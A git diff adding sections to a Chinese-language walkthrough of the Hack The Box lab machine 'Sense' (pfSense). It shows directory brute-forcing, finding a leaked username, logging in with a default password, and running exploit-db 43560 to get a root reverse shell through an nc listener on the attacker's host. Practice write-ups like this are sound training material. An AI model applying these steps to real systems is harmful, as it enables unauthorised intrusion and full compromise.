@@ -48,6 +48,24 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /xmlrpc.php           (Status: 200) [Size: 384]  
 ```
 
+另外用dirserch找到一个文件Changelog.txt
+```
+# Security Changelog 
+
+### Issue
+There was a failure in updating the firewall. Manual patching is therefore required
+
+### Mitigated
+2 of 3 vulnerabilities have been patched.
+
+### Timeline
+The remaining patches will be installed during the next maintenance window
+```
+
+说更新防火墙失败，已经修改了三个漏洞中的两个。
+意思是还有一个漏洞没有修复？
+
+## 搜寻cms漏洞
 80端口是一个叫pfsense的cms，搜索这个cms的漏洞，多数是一些xss漏洞，也有命令注入漏洞，我们重点关注命令注入这一块。
 ```
 ─# searchsploit pfsense
@@ -85,6 +103,108 @@ Shellcodes: No Results
 
 然而命令注入漏洞要求cms的密码，所以密码是什么？
 
+## 指定扩展名爆破
+指定特定几个扩展文件名，换一个大一些的字典，再次爆破
+```
+$ gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,cgi,html,txt -t 20
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://10.10.10.60
+[+] Method:                  GET
+[+] Threads:                 30
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,cgi,html,txt
+[+] Timeout:                 10s
+===============================================================
+2021/12/11 02:41:05 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php (Status: 200)
+/index.html (Status: 200)
+/help.php (Status: 200)
+/themes (Status: 301)
+/stats.php (Status: 200)
+/css (Status: 301)
+/edit.php (Status: 200)
+/includes (Status: 301)
+/license.php (Status: 200)
+/system.php (Status: 200)
+/status.php (Status: 200)
+/javascript (Status: 301)
+/changelog.txt (Status: 200)
+/classes (Status: 301)
+/exec.php (Status: 200)
+/widgets (Status: 301)
+/graph.php (Status: 200)
+/tree (Status: 301)
+/wizard.php (Status: 200)
+/shortcuts (Status: 301)
+/pkg.php (Status: 200)
+/installer (Status: 301)
+/wizards (Status: 301)
+/xmlrpc.php (Status: 200)
+/reboot.php (Status: 200)
+/interfaces.php (Status: 200)
+/csrf (Status: 301)
+/system-users.txt (Status: 200)
+/filebrowser (Status: 301)
+/%7Echeckout%7E (Status: 403)
+```
 
 
- wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt  --hc 404,403 https://10.10.10.60/FUZZFUZ2Z
+system-users.txt提示
+```
+####Support ticket###
+
+Please create the following user
+
+
+username: Rohit
+password: company defaults
+```
+
+现在我们知道了一个登陆的用户名，密码据称是公司默认密码
+
+
+谷歌这个cms的默认登录密码是```admin:pfsense```
+
+现在用```rohit:pfsense```就可以正常登录
+
+
+# 攻击
+我们选择[这个exp](https://www.exploit-db.com/exploits/43560)
+
+根据exp步骤：
+1. 开启一个监听
+> nc -lnvp 4444
+
+2. 执行攻击
+```
+─(root💀kali)-[~/htb/Sense]
+└─# python3 43560.py --rhost 10.10.10.60 --lhos 10.10.14.3 --lpor 4444 --username rohit --password pfsense
+CSRF token obtained
+Running exploit...
+Exploit completed
+```
+
+3.收到反弹shell
+```
+┌──(root💀kali)-[~/htb/Sense]
+└─# nc -lnvp 4444                  
+listening on [any] 4444 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.60] 7866
+sh: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+# whoami
+root
+```
+
+已经是root权限，可以读取任何文件。
+
+# 总结
+做完以后会发现是很简单的靶机，困难的地方在于第二次目录爆破的时候选择扩展名和字典。我在这里卡了很久，试过各种爆破工具和大大小小的字典。
+直接在浏览器爆出用户名有点ctf的意思，真实环境应该很少这种情况。
